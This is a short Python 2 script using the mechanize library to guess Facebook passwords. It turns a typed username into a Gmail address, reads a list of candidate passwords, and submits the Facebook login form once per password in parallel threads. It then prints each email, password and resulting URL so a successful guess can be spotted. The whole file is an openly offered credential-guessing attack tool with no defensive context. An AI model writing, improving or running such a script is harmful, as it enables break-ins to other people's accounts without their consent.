import mechanize
import itertools
import sys
from threading import Thread

def login(name,password):
    email = str(name)+'@gmail.com'
    password = password
    br = mechanize.Browser()
    br.set_handle_robots(False)
    br.addheaders = [('User-agent', 'Mozilla/5.0')]
    br.open('https://www.facebook.com')
    br.select_form(nr=0)
    br.form['email'] = str(email)
    br.form['pass'] = str(password)
    br.submit()
    print '\nEmail: ',email
    print 'Password: ',password
    print 'Url: ',br.geturl()



def create_usernames():
    firstname = raw_input('Enter Username: ')
    passwords = []
    size_of_list = int(input('Enter no. of Passwords to check: '))
    print ''
    for x in range(1, size_of_list + 1):
        password = raw_input('Enter Password: ')
        passwords.append(password)
    for passw in passwords:
        username = firstname
        t = Thread(target=login, args=(username,passw))
        t.start()

create_usernames()
    
